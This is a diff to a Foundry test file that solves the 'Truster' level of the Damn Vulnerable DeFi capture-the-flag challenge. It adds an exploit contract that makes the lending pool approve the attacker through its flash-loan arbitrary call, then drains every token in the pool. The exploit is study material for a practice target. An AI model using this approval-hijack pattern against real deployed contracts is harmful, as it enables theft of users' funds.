@@ -51,7 +51,8 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+
+        new TrusterExploiter(pool, token, recovery);
     }
 
     /**
@@ -65,4 +66,22 @@ contract TrusterChallenge is Test {
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
     }
+}
+
+
+contract TrusterExploiter {
+    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) {
+
+        //~ Dynamic types (bytes, string, dynamic arrays) must be 
+        //~ explicitly specified for data locations within the function.(storage/memory/calldata)
+        // Prepare the calldata to approve this contract to spend the pool's tokens
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), _token.balanceOf(address(_pool)));
+
+        //~ set target = token, call `approval` to leave a backdoor 
+        _pool.flashLoan(0, address(this), address(_token), data);
+
+        // Transfer the approved tokens to the recovery account
+        _token.transferFrom(address(_pool), _recovery, _token.balanceOf(address(_pool)));
+    }
+
 }
